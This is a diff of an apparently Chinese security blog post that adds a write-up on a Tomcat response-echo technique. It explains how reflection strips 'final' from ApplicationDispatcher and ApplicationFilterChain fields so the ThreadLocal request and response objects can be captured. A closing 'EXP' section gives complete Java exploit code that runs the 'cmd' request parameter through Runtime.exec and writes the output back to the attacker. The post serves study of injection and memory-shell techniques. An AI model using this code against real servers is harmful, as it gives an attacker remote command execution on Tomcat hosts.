@@ -88,19 +88,109 @@
 
                 <h2 class="section-heading">前言</h2>
 
-                <p>&nbsp;&nbsp;&nbsp;</p>
+                <p>&nbsp;&nbsp;&nbsp;之前的内存马只是通过jsp实现，因为jsp内置request和response类，所以回显也比较方便，这次来学习一下tomcat回显的利用链。</p>
+                  
               
-              <h2 class="section-heading">搭建环境</h2>
+              <h2 class="section-heading">ThreadLocal获取request和response类</h2>
               
+              <p>&nbsp;&nbsp;&nbsp;总的思路是利用request类获取要执行的指令，之后把执行后的指令利用response输出。
+                整个利用链主要就在org.apache.catalina.core中的ApplicationFilterChain类里，第一次触发时来到static处，
+              此时还没执行我们的恶意代码，并且static代码段优先执行。</p>
+            <p>&nbsp;&nbsp;&nbsp;可以看到这里对lastServicedRequest和lastServicedResponse做了一次初始化，
+            这里还需要关注一下它们的属性是private static final。</p>
               
-              <h2 class="section-heading">搭建环境</h2>
-
-
-
+              <a data-fancybox="gallery" href="../img/2022-3-30/1-1.jpg">
+                <img class="img-fluid" src="../img/2022-3-30/1-1.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;从ApplicationFilterChain类走完后，会开始执行我们的代码。可以看到我们的代码中有好几处使用setInt赋了一个奇怪的值，
+              其实这里是在修改private static final变量的值，关于如何修改private static final的值可以看下面这篇文章。</p>
+            
+              <div>
                 
-
+                <pre class='hljs'><code><span class="hljs-string">https:</span><span class="hljs-comment">//www.cnblogs.com/noKing/p/9038234.html</span></code></pre>
+                
+              </div>
+              
+            <p>&nbsp;&nbsp;&nbsp;接着，做完修改属性后进入一个判断，这里主要是判断第一次加载还是第二次加载，如果是第一次加载，lastServicedRequest刚刚在上面初始化完，自然便是null。
+          所以cmd取null并且进入第一个if中，这里对WRAP_SAME_OBJECT_FIELD进行了setBoolean为true。</p>
+            
 
               
+              <a data-fancybox="gallery" href="../img/2022-3-30/1-2.jpg">
+                <img class="img-fluid" src="../img/2022-3-30/1-2.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;WRAP_SAME_OBJECT_FIELD进行了setBoolean为true后，我们第二次访问触发走到ApplicationFilterChain类的这个地方时，
+              会把request，response分别赋值给lastServicedRequest和lastServicedResponse。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-30/1-3.jpg">
+                <img class="img-fluid" src="../img/2022-3-30/1-3.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;同样的在第二次跑完ApplicationFilterChain类后，又会回到我们的代码。在这个地方中利用request类获取get过来的参数，
+              利用Runtime.getRuntime().exec(cmd)执行完命令后，又通过获取到的response类回显。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-30/1-4.jpg">
+                <img class="img-fluid" src="../img/2022-3-30/1-4.jpg" alt="">
+              </a>
+              
+              <h2 class="section-heading">总结</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;这里要访问两次的原因是第一次需通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT，将lastServicedRequest和lastServicedResponse初始化。</p>
+                  <p>&nbsp;&nbsp;&nbsp;第二次访问是为了将request类跟response类存储到lastServicedRequest和lastServicedResponse中。再将request和response类从lastServicedRequest和lastServicedResponse取出，从request类中获取要执行的命令，最后将结果写入response回显。</p>
+
+
+                <h2 class="section-heading">EXP</h2>
+                
+              <div>
+              	
+              	<pre class='hljs'><code><span class="hljs-keyword">try</span> {
+    <span class="hljs-keyword">Class</span> applicationDispatcher = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">"org.apache.catalina.core.ApplicationDispatcher"</span>);
+    Field WRAP_SAME_OBJECT_FIELD = applicationDispatcher.getDeclaredField(<span class="hljs-string">"WRAP_SAME_OBJECT"</span>);
+    WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-keyword">true</span>);
+    <span class="hljs-comment">// 利用反射修改final变量</span>
+    Field f0 = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">"java.lang.reflect.Field"</span>).getDeclaredField(<span class="hljs-string">"modifiers"</span>);
+    f0.setAccessible(<span class="hljs-keyword">true</span>);
+    <span class="hljs-comment">// 把final修饰符去掉</span>
+    f0.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.<span class="hljs-keyword">FINAL</span>);
+
+    <span class="hljs-keyword">Class</span> applicationFilterChain = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">"org.apache.catalina.core.ApplicationFilterChain"</span>);
+    Field lastServicedRequestField = applicationFilterChain.getDeclaredField(<span class="hljs-string">"lastServicedRequest"</span>);
+    Field lastServicedResponseField = applicationFilterChain.getDeclaredField(<span class="hljs-string">"lastServicedResponse"</span>);
+    lastServicedRequestField.setAccessible(<span class="hljs-keyword">true</span>);
+    lastServicedResponseField.setAccessible(<span class="hljs-keyword">true</span>);
+    f0.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.<span class="hljs-keyword">FINAL</span>);
+    f0.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.<span class="hljs-keyword">FINAL</span>);
+
+    ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(applicationFilterChain);
+    ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(applicationFilterChain);
+
+    <span class="hljs-comment">// 判断第一次是否反序列化成功</span>
+    String cmd = lastServicedRequest != <span class="hljs-keyword">null</span> ? lastServicedRequest.get().getParameter(<span class="hljs-string">"cmd"</span>) : <span class="hljs-keyword">null</span>;
+    <span class="hljs-comment">// 第一个if内为第一次触发时执行的代码</span>
+    <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == <span class="hljs-keyword">null</span> || lastServicedResponse == <span class="hljs-keyword">null</span>) {
+        WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher, <span class="hljs-keyword">true</span>);
+        lastServicedRequestField.set(applicationFilterChain, <span class="hljs-keyword">new</span> ThreadLocal());
+        lastServicedResponseField.set(applicationFilterChain, <span class="hljs-keyword">new</span> ThreadLocal());
+    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) {
+        InputStream inputStream = <span class="hljs-keyword">Runtime</span>.getRuntime().exec(cmd).getInputStream();
+        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder(<span class="hljs-string">""</span>);
+        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];
+        <span class="hljs-keyword">int</span> line = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">while</span> ((line = inputStream.<span class="hljs-keyword">read</span>(bytes)) != -<span class="hljs-number">1</span>) {
+            sb.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">new</span> String(bytes, <span class="hljs-number">0</span>, line));
+        }
+        Writer writer = lastServicedResponse.get().getWriter();
+        writer.<span class="hljs-keyword">write</span>(sb.toString());
+        writer.flush();
+    }
+} <span class="hljs-keyword">catch</span> (Exception e) {
+    e.printStackTrace();
+}</code></pre>
+              	
+              	
+              </div>
               
            
                 <h2 class="section-heading">There Is Nothing Below</h2>
